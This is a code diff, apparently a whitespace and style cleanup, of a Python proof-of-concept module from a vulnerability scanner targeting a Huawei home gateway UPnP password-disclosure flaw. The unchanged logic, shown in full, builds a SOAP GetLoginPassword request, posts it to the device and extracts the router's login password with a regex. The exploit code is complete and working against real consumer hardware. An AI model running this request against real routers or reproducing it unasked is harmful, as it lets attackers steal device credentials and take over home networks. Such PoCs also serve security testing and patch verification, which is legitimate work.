@@ -6,6 +6,7 @@ import re
 import socket
 import urllib
 
+
 class Vuln(ABVuln):
     vuln_id = 'Huawei_0001'  # 平台漏洞编号，留空
     name = 'Huawei Home Gateway UPnP/1.0 IGD/1.00 密码泄露'  # 漏洞名称
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '华为'  # 漏洞应用名称
     product_version = 'Huawei Home Gateway UPnP/1.0 IGD/1.00'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'ccab5d83-ec24-4ea5-be32-85b7cd688639'
@@ -37,7 +39,7 @@ class Poc(ABPoc):
             # set timeout
             timeout = 20
             socket.setdefaulttimeout(timeout)
-            #取出地址和端口
+            # 取出地址和端口
             proto, rest = urllib.splittype(self.target)
             host, rest = urllib.splithost(rest)
             host, port = urllib.splitport(host)
@@ -48,17 +50,17 @@ class Poc(ABPoc):
             server_address = (host, 80)
             sock.connect(server_address)
             soap = "<?xml version=\"1.0\"?>"
-            soap +="<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
-            soap +="<s:Body>"
-            soap +="<m:GetLoginPassword xmlns:m=\"urn:dslforum-org:service:UserInterface:1\">"
-            soap +="</m:GetLoginPassword>"
-            soap +="</s:Body>"
-            soap +="</s:Envelope>"
+            soap += "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
+            soap += "<s:Body>"
+            soap += "<m:GetLoginPassword xmlns:m=\"urn:dslforum-org:service:UserInterface:1\">"
+            soap += "</m:GetLoginPassword>"
+            soap += "</s:Body>"
+            soap += "</s:Envelope>"
             message = "POST /UD/?5 HTTP/1.1\r\n"
             message += "SOAPACTION: \"urn:dslforum-org:service:UserInterface:1#GetLoginPassword\"\r\n"
             message += "Content-Type: text/xml; charset=\"utf-8\"\r\n"
             message += "Host:" + host + "\r\n"
-            message += "Content-Length:" + str(len(soap)) +"\r\n"
+            message += "Content-Length:" + str(len(soap)) + "\r\n"
             message += "Expect: 100-continue\r\n"
             message += "Connection: Keep-Alive\r\n\r\n"
             sock.send(message)
@@ -70,14 +72,15 @@ class Poc(ABPoc):
             r = re.compile('<NewUserpassword>(.*?)</NewUserpassword>')
             m = r.search(data)
             if m:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
